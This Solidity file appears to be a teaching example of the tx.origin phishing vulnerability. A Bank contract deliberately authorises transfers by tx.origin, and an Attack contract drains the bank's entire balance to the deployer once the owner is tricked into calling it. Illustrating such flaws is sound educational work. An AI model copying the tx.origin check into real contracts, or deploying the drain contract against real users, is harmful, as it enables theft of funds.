// SPDX-License-Identifier: MIT
// english translation by 22X
pragma solidity ^0.8.17;
contract Bank {
    address public owner; // Records the owner of the contract

    // Assigns the value to the owner variable when the contract is created
    constructor() payable {
        owner = msg.sender;
    }

    function transfer(address payable _to, uint _amount) public {
        // Check the message origin !!! There may be phishing risks if the owner is induced to call this function!
        require(tx.origin == owner, "Not owner");
        // Transfer ETH
        (bool sent, ) = _to.call{value: _amount}("");
        require(sent, "Failed to send Ether");
    }
}

contract Attack {
    // Beneficiary address
    address payable public hacker;
    // Bank contract address
    Bank bank;

    constructor(Bank _bank) {
        // Forces the conversion of the address type _bank to the Bank type
        bank = Bank(_bank);
        // Assigns the beneficiary address to the deployer's address
        hacker = payable(msg.sender);
    }

    function attack() public {
        // Induces the owner of the Bank contract to call, transferring all the balance to the hacker's address
        bank.transfer(hacker, address(bank).balance);
    }
}